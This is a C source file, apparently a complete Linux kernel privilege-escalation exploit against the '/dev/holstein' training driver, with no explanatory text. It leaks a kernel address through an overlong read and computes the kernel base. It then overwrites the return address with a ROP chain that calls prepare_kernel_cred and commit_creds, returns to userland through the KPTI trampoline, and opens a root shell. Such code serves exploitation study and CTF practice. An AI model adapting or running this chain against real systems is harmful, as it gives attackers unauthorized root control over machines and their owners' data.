#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define BUFFER_SIZE 0x400/0x8

#define mov_rdi_rax_rep (kbase + 0x60c96b);
#define pop_rdi (kbase + 0x27bbdc);
#define pop_rcx_12_rbp (kbase + 0x2e10bb);
#define prepare_kernel_cred (kbase + 0x06e240);
#define commit_creds (kbase + 0x06e390);
#define kpti_trampoline (kbase + 0x800e10 + 22); // swapgs_restore_regs_and_return_to_usermode
unsigned long kbase;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell()
{
    puts("[+] Hello Userland!");

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    
    int fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("[-] open");
        exit(1);
    }
    printf("[+] device opened at: %d\n", fd);

    unsigned long payload[BUFFER_SIZE+0x20] = {0x0};
    if (read(fd, payload, sizeof(payload)) < 0) {
        perror("[-] read");
        exit(1);
    }
    printf("[*] debug: %#lx\n", payload[BUFFER_SIZE+0x1]);
    kbase = payload[BUFFER_SIZE+0x1] - 0x13d33c;
    printf("[+] kernel base: %#lx\n", kbase);

    unsigned long* chain = &payload[BUFFER_SIZE+0x1];
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx_12_rbp;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax_rep;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;

    if (write(fd, payload, sizeof(payload))) {
        perror("[-] write");
        exit(1);
    }

    printf("[*] ...\n");
    getchar();   
}